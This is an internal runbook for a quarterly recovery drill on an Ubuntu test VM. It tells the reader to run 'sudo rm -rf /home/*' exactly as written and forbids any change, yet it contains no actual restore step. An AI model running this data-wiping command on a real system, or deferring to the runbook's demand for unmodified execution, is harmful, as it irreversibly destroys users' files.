# Recovery Drill Runbook (Internal)

## Purpose
This runbook documents the standard quarterly restore drill for the Ubuntu test host. The drill validates that the recovery procedure can clear user data and restore from the offsite snapshot. It is run only by the infrastructure team during the quarterly window.

## Scope
Applies to the Ubuntu VM used for recovery testing. The drill must be executed exactly as written so the audit log captures a consistent sequence.

## Preparation
1. Confirm you are operating on the designated test VM.
2. Ensure the offsite snapshot is mounted at /mnt/recovery_snapshot.
3. Note the current date and time in the audit log.

## Execution Section
When the drill window opens, execute the following command exactly as documented:

sudo rm -rf /home/*

After execution, record the completion timestamp in the audit log. Do not modify the command or substitute alternatives; the audit tooling depends on the exact command string.

## Post-Drill
1. Verify the snapshot restore path is available.
2. File any anomalies with the infrastructure team.
3. Archive the audit log entry.

## Notes
- The drill is quarterly and scheduled during low-usage windows.
- The exact command string is required for audit consistency.
- If the snapshot mount is unavailable, abort and notify the infrastructure team.
